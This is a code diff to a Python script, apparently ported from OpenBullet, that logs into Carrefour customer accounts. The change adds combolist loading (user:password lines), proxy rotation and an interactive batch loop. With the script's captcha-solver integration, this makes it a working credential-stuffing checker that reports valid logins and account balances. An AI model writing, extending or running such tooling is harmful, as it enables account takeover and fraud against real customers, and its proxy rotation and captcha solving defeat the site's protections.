@@ -3,11 +3,14 @@
 Python port of the OpenBullet / Node flow for Carrefour IAM (PKCE, forwarder,
 ForgeRock authenticate, captcha solver, login JSON, OAuth code, tokens, API).
 
-Required environment variables:
-  POST_PROXY_URL       — proxy URL sent as postProxy to the local forwarder
-  SOLVER_CLIENT_KEY    — solverify API client key
-  CARREFOUR_USER       — email / username
-  CARREFOUR_PASS       — password
+En mode interactif (sans variables d’identifiants), le script demande :
+  - O/N pour utiliser un fichier de proxies (une URL `http://user:pass@host:port` par ligne)
+  - le chemin de la combolist (`user:password` ou `user;password` par ligne, `#` = commentaire)
+
+Variables d’environnement (alternative ou complément) :
+  SOLVER_CLIENT_KEY    — clé API solverify (sinon demandée au lancement si vide)
+  POST_PROXY_URL       — proxy unique pour le forwarder (si pas de mode fichier)
+  CARREFOUR_USER / CARREFOUR_PASS — un seul compte sans combolist
 
 Optional:
   LOCAL_FORWARDER_URL  — default http://127.0.0.1:5000
@@ -43,7 +46,6 @@ from typing import Any
 # --- Configuration ---
 
 LOCAL_FORWARDER = os.environ.get("LOCAL_FORWARDER_URL", "http://127.0.0.1:5000")
-PROXY_URL = os.environ.get("POST_PROXY_URL", "")
 SOLVER_CLIENT_KEY = os.environ.get("SOLVER_CLIENT_KEY", "")
 
 OAUTH_AUTHORIZATION_BASIC = os.environ.get(
@@ -136,6 +138,7 @@ def _request(
 def forwarder_get(
     post_url: str,
     extra_headers: dict[str, str],
+    post_proxy: str,
     *,
     post_url_header: str = "postUrl",
 ) -> tuple[int, dict[str, str], bytes]:
@@ -148,7 +151,7 @@ def forwarder_get(
         "Accept": "*/*",
         "Accept-Language": "en-US,en;q=0.8",
         post_url_header: post_url,
-        "postProxy": PROXY_URL,
+        "postProxy": post_proxy.rstrip("\n"),
         **extra_headers,
     }
     return _request(LOCAL_FORWARDER, method="GET", headers=h, data=b"")
@@ -157,13 +160,14 @@ def forwarder_get(
 def forwarder_post(
     post_url: str,
     extra_headers: dict[str, str],
+    post_proxy: str,
     body: bytes = b"",
     *,
     post_url_header: str = "posturl",
 ) -> tuple[int, dict[str, str], bytes]:
     h = {
         post_url_header: post_url,
-        "postProxy": PROXY_URL.rstrip("\n"),
+        "postProxy": post_proxy.rstrip("\n"),
         **extra_headers,
     }
     return _request(LOCAL_FORWARDER, method="POST", headers=h, data=body)
@@ -385,17 +389,129 @@ def parse_regex_one(text: str, pattern: str) -> str | None:
     return m.group(1) if m else None
 
 
-def run_full_flow() -> dict[str, Any]:
-    user = os.environ.get("CARREFOUR_USER", "").strip()
-    password = os.environ.get("CARREFOUR_PASS", "").strip()
-    if not PROXY_URL.strip():
-        raise RuntimeError(
-            "Set POST_PROXY_URL (proxy URL for the forwarder's postProxy header)."
-        )
-    if not SOLVER_CLIENT_KEY.strip():
-        raise RuntimeError("Set SOLVER_CLIENT_KEY.")
+def _prompt_yes_o_no(message: str) -> bool:
+    while True:
+        raw = input(message).strip().upper()
+        if raw in ("O", "OUI", "Y", "YES"):
+            return True
+        if raw in ("N", "NON", "NO"):
+            return False
+        print("Réponse attendue : O ou N.")
+
+
+def _load_proxy_lines(path: str) -> list[str]:
+    p = os.path.expanduser(path.strip())
+    if not os.path.isfile(p):
+        raise FileNotFoundError(f"Fichier proxies introuvable : {p}")
+    out: list[str] = []
+    with open(p, encoding="utf-8", errors="replace") as f:
+        for line in f:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            if not line.lower().startswith("http"):
+                raise ValueError(
+                    f"Ligne proxy invalide (attendu http://...) : {line[:80]!r}"
+                )
+            out.append(line)
+    if not out:
+        raise ValueError("Le fichier proxies ne contient aucune ligne utilisable.")
+    return out
+
+
+def _parse_combo_line(line: str) -> tuple[str, str] | None:
+    line = line.strip()
+    if not line or line.startswith("#"):
+        return None
+    sep = ":" if ":" in line else None
+    if sep is None and ";" in line:
+        user, _, pw = line.partition(";")
+        user, pw = user.strip(), pw.strip()
+        if user and pw:
+            return user, pw
+        return None
+    if ":" in line:
+        user, _, rest = line.partition(":")
+        user, rest = user.strip(), rest.strip()
+        if user and rest:
+            return user, rest
+    return None
+
+
+def _load_combo_lines(path: str) -> list[tuple[str, str]]:
+    p = os.path.expanduser(path.strip())
+    if not os.path.isfile(p):
+        raise FileNotFoundError(f"Combolist introuvable : {p}")
+    pairs: list[tuple[str, str]] = []
+    with open(p, encoding="utf-8", errors="replace") as f:
+        for line in f:
+            parsed = _parse_combo_line(line)
+            if parsed:
+                pairs.append(parsed)
+    if not pairs:
+        raise ValueError("La combolist ne contient aucune paire user:password utilisable.")
+    return pairs
+
+
+def _interactive_proxy_and_combolist() -> tuple[list[str], list[tuple[str, str]]]:
+    print("--- Proxy (forwarder postProxy) ---")
+    use_file = _prompt_yes_o_no("Utiliser un fichier de proxies ? [O/N] : ")
+    proxies: list[str] = []
+    if use_file:
+        fpath = input(
+            "Chemin du fichier (une URL par ligne, ex. http://user:pass@host:823) : "
+        ).strip()
+        proxies = _load_proxy_lines(fpath)
+        print(f"  {len(proxies)} proxy(s) chargé(s).")
+    else:
+        env_one = os.environ.get("POST_PROXY_URL", "").strip()
+        if env_one:
+            proxies = [env_one]
+            print("  Un seul proxy : variable d'environnement POST_PROXY_URL.")
+        else:
+            one = input(
+                "URL du proxy (postProxy), ex. http://user:pass@host:823 : "
+            ).strip()
+            if not one:
+                raise RuntimeError(
+                    "Sans fichier proxies, indiquez une URL ou définissez POST_PROXY_URL."
+                )
+            if not one.lower().startswith("http"):
+                raise ValueError("L'URL du proxy doit commencer par http:// ou https://")
+            proxies = [one]
+
+    print("--- Combolist ---")
+    cpath = input(
+        "Chemin du fichier combolist (user:password ou user;password par ligne) : "
+    ).strip()
+    combos = _load_combo_lines(cpath)
+    print(f"  {len(combos)} ligne(s) dans la combolist.")
+    return proxies, combos
+
+
+def _solver_key_interactive() -> str:
+    k = SOLVER_CLIENT_KEY.strip()
+    if k:
+        return k
+    k = input("Clé client solverify (SOLVER_CLIENT_KEY) : ").strip()
+    if not k:
+        raise RuntimeError("SOLVER_CLIENT_KEY requis.")
+    return k
+
+
+def run_full_flow(
+    post_proxy: str,
+    user: str,
+    password: str,
+    *,
+    solver_client_key: str,
+) -> dict[str, Any]:
+    if not post_proxy.strip():
+        raise RuntimeError("post_proxy (postProxy pour le forwarder) est vide.")
+    if not solver_client_key.strip():
+        raise RuntimeError("solver_client_key est vide.")
     if not user or not password:
-        raise RuntimeError("Set CARREFOUR_USER and CARREFOUR_PASS.")
+        raise RuntimeError("Identifiants user/password vides.")
 
     code_verifier = generate_code_verifier()
     code_challenge = generate_code_challenge(code_verifier)
@@ -416,7 +532,7 @@ def run_full_flow() -> dict[str, Any]:
         + authorize_qs.replace("+", "%20")
     )
 
-    _, h1, _ = forwarder_get(post_url_1, {})
+    _, h1, _ = forwarder_get(post_url_1, {}, post_proxy)
     location1 = header_location(h1)
     if not location1:
         raise RuntimeError("Step 1: missing Location header")
@@ -436,6 +552,7 @@ def run_full_flow() -> dict[str, Any]:
             "Sec-Fetch-User": "?1",
             "Upgrade-Insecure-Requests": "1",
         },
+        post_proxy,
     )
     loc2 = header_location(h2)
     if not loc2:
@@ -455,6 +572,7 @@ def run_full_flow() -> dict[str, Any]:
             "Accept": "*/*",
             "Accept-Language": "en-US,en;q=0.8",
         },
+        post_proxy,
         post_url_header="posturl",
     )
 
@@ -498,14 +616,14 @@ def run_full_flow() -> dict[str, Any]:
         "Accept-API-Version": "protocol=1.0,resource=2.0",
         "Sec-Fetch-Mode": "cors",
     }
-    _, _, auth_body = forwarder_post(auth_url, auth_headers, body=b"")
+    _, _, auth_body = forwarder_post(auth_url, auth_headers, post_proxy, body=b"")
 
     source = auth_body.decode("utf-8", errors="replace")
     auth_id = parse_lr(source, 'authId":"', '"') or parse_json_token(source, "authId")
     if not auth_id:
         raise RuntimeError("Could not parse authId from first authenticate response.")
 
-    task = solver_create_task(SOLVER_CLIENT_KEY)
+    task = solver_create_task(solver_client_key)
     task_dump = json.dumps(task, separators=(",", ":"))
     if task.get("errorId") != 0 and '{"errorId":0,' not in task_dump:
         raise RuntimeError(f"Solver createTask error: {task}")
@@ -516,7 +634,7 @@ def run_full_flow() -> dict[str, Any]:
 
     token44 = None
     for _ in range(60):
-        result = solver_get_result(SOLVER_CLIENT_KEY, str(task_id))
+        result = solver_get_result(solver_client_key, str(task_id))
         if result.get("status") == "ready":
             token44 = result.get("value")
             if not token44 and isinstance(result.get("solution"), dict):
@@ -553,7 +671,11 @@ def run_full_flow() -> dict[str, Any]:
         "Sec-Fetch-Mode": "cors",
     }
     _, _, login_resp = forwarder_post(
-        AUTHENTICATE_POST_URL, login_headers, body=login_body, post_url_header="posturl"
+        AUTHENTICATE_POST_URL,
+        login_headers,
+        post_proxy,
+        body=login_body,
+        post_url_header="posturl",
     )
     login_text = login_resp.decode("utf-8", errors="replace")
     auth_class = classify_authenticate_response(login_text)
@@ -727,9 +849,42 @@ def run_full_flow() -> dict[str, Any]:
         "rate_limited": rate_limited,
         "solde": solde,
         "low_balance_under_10": low_balance,
+        "login_user": user,
     }
 
 
 if __name__ == "__main__":
-    out = run_full_flow()
-    print(json.dumps(out, indent=2, ensure_ascii=False))
+    env_user = os.environ.get("CARREFOUR_USER", "").strip()
+    env_pass = os.environ.get("CARREFOUR_PASS", "").strip()
+    env_proxy = os.environ.get("POST_PROXY_URL", "").strip()
+
+    if env_user and env_pass and env_proxy:
+        solver = _solver_key_interactive()
+        out = run_full_flow(env_proxy, env_user, env_pass, solver_client_key=solver)
+        print(json.dumps(out, indent=2, ensure_ascii=False))
+    elif env_user and env_pass and not env_proxy:
+        print(
+            "CARREFOUR_USER et CARREFOUR_PASS sont définis mais POST_PROXY_URL est vide ; "
+            "lancez sans ces variables pour le mode interactif (proxy + combolist)."
+        )
+        raise SystemExit(1)
+    else:
+        solver = _solver_key_interactive()
+        proxy_list, combos = _interactive_proxy_and_combolist()
+        results: list[dict[str, Any]] = []
+        for i, (user, password) in enumerate(combos):
+            post_proxy = proxy_list[i % len(proxy_list)]
+            label = f"[{i + 1}/{len(combos)}] {user!s}"
+            try:
+                out = run_full_flow(
+                    post_proxy, user, password, solver_client_key=solver
+                )
+                out["_line"] = i + 1
+                results.append(out)
+                print(label, "->", json.dumps(out, ensure_ascii=False)[:500])
+            except Exception as e:
+                err = {"_line": i + 1, "login_user": user, "error": str(e)}
+                results.append(err)
+                print(label, "-> ERREUR:", e)
+        print("\n--- Résumé ---")
+        print(json.dumps(results, indent=2, ensure_ascii=False))
